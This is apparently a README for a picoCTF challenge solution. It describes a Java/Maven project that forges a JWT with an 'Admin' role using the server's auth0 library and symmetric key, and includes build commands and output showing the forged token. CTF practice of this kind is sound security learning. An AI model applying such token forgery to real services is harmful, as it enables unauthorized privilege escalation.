# PicoCTF Web Exploitation: Java Code Analysis Challenge

This is java code that i needed to generate a JWT token based on a symetric secret key. 
The CTF challenge requires us to tamper with a JWT token to assign a more priviliged role to a user.
Tokens that get signed from other libraries or online tools get rejected by the java server.

The only way for the token to get accepted is to use the same implementation as the server's. That is the `auth0` dependency implementation of JWT.

## Java Version Requirement

I used java `11` for this project, and it is hardcoded in the `pom.xml` configuration file.

```xml
<build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>3.8.1</version>
                <configuration>
                    <source>11</source>   <!-- Java 11 as the source version -->
                    <target>11</target>   <!-- Java 11 as the target version -->
                </configuration>
            </plugin>
        </plugins>
    </build>
```

## How to use this code?

First make sure your working directory is the root of this project, meaning you are in the same directory as the `pom.xml` configuration file.

Second make sure you have `maven` installed.

```
mvn -v
```

If not install it

```
sudo apt install maven
```

next use maven to build the project

```
mvn clean install
```

Go to the `CreateJWT.java` file (`src/main/java/com/jwtproject/CreateJWT.java`) and modify the JWT token payload. The three keys you need to modfiy are these variables:

```java
    Integer userId  = 6;
    String email    = "pico@ctf.org";
    String role     = "Admin";
```

This is an example token payload:

```json
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1734090386,
  "iat": 1733485586,
  "userId": 6,
  "email": "pico@ctf.org"
}
```

Then compile and run the project to get the JWT token

```
mvn compile exec:java -Dexec.mainClass="com.jwtproject.CreateJWT"
```

And here is what should the output look like:

```console
mvn compile exec:java -Dexec.mainClass="com.jwtproject.CreateJWT"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[INFO] Scanning for projects...
[INFO] 
[INFO] ----------------------< com.jwtproject:jwt-demo >-----------------------
[INFO] Building jwt-demo 1.0
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ jwt-demo ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /home/kali/PicoCTF/web_exploitation/Java_Code_Analysis/JWT-Token-Java-Auth0/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.1:compile (default-compile) @ jwt-demo ---
[INFO] Nothing to compile - all classes are up to date
[INFO] 
[INFO] --- exec-maven-plugin:3.5.0:java (default-cli) @ jwt-demo ---
Generated JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3MzQwOTc3MzUsImlhdCI6MTczMzQ5MjkzNSwidXNlcklkIjo2LCJlbWFpbCI6InBpY29AY3RmLm9yZyJ9.g3FC3_alodRqD-xwL9rb9B-q5c3xMPNKW4-CxJKDB8U
Verified JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3MzQwOTc3MzUsImlhdCI6MTczMzQ5MjkzNSwidXNlcklkIjo2LCJlbWFpbCI6InBpY29AY3RmLm9yZyJ9.g3FC3_alodRqD-xwL9rb9B-q5c3xMPNKW4-CxJKDB8U
Role: Admin
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  2.019 s
[INFO] Finished at: 2024-12-06T08:48:55-05:00
[INFO] ------------------------------------------------------------------------
```